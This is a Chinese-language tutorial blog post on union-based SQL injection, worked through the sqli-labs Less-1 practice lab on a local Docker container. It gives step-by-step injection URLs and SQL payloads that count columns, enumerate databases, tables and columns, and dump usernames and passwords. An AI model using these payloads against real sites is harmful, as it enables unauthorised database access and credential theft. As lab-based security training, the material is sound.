---
layout: post
title: "1.2.1-SQL注入-SQL注入语法类型-union联合查询注入"
date: 2018-06-16
category: web安全
tags: sql注入
---

## union查询注入

### union介绍

SQL UNION 操作符  
用于合并两个或多个SELECT语句的结果集。  
注意：  
SELECT语句必须拥有**相同数量**的列。  
列也必须拥有**相似的数据类型**。  
每条SELECT语句中列的**顺序必须相同**。  

默认情况，UNION操作符选取不同的值，允许重复的值，使用UNION ALL。  

	SELECT column_name(s) FROM table_name1
	UNION
	SELECT column_name(s) FROM table_name2

	SELECT column_name(s) FROM table_name1
	UNION ALL
	SELECT column_name(s) FROM table_name2

### union查询注入方法

#### UNION 注入应用场景  

前提：  
1.只要UNION连接的几个查询的字段数一样且列的数据类型转换没有问题，就可以查询出结果；
2.注入点页面有回显；

注意点：  
1.只有最后一个SELECT子句允许有ORDER BY；
2.只有最后一个SELECT子句允许有LIMIT；

	mysql> select * from users order by id union select 1,2,3;
	错误 orderby 要在最后一个子句后面

	mysql> select * from users limit 0,1 union select;
	错误 limit 要在最后一个子句后面

#### UNION注入过程-根据Sqli-labs Less1-4学习

tips：order by 猜出来的列数超过数据库表中的列数，报错并不能返回数据  

1. order by 确定列数
2. 观察页面返回，选取可以显示数据的位置，进行下一步的注入
3. 读库信息
4. 读表信息 
5. 读字段
6. 读数据


---



	docker run -dt --name sqli -p 90:80 --rm acgpiano/sqli-labs 
	docker ps -a
	docker exec -it <id> /bin/bash
	mysql -uroot -p
	show databases;
	use security;

	1. select * from users order by 4; // order by 判断多少列 从1～3 报错了确定有4列

	2. select * from users where id=1 union select 1,2,3;
	select * from users where id=-1 union select 1,(select version()),3;

	3. select * from users where id=-1 union select 1,2,(select group_concat(schema_name) from information_schema.schemata);

	4. select * from users where id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security'); // 当前库可以换成database() ''不识别可以换成十六进制0x

	5. select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users');

	6. select * from users where id=-1 union select 1,2,(select group_concat(username,0x7e,password) from users);


浏览器访问：  
http://127.0.0.1:90/Less-1/  

	http://127.0.0.1:90/Less-1/?id=1'
	http://127.0.0.1:90/Less-1/?id=1' order by 1 --+ // 二分法试
	http://127.0.0.1:90/Less-1/?id=-1' union select 1,2,3 --+
	http://127.0.0.1:90/Less-1/?id=-1' union select 1,2,(version())--+ // user() database()

	http://127.0.0.1:90/Less-1/?id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+

	http://127.0.0.1:90/Less-1/?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')--+

	http://127.0.0.1:90/Less-1/?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users')--+

	http://127.0.0.1:90/Less-1/?id=-1' union select 1,2,(select group_concat(username,0x7e,password) from users)--+

















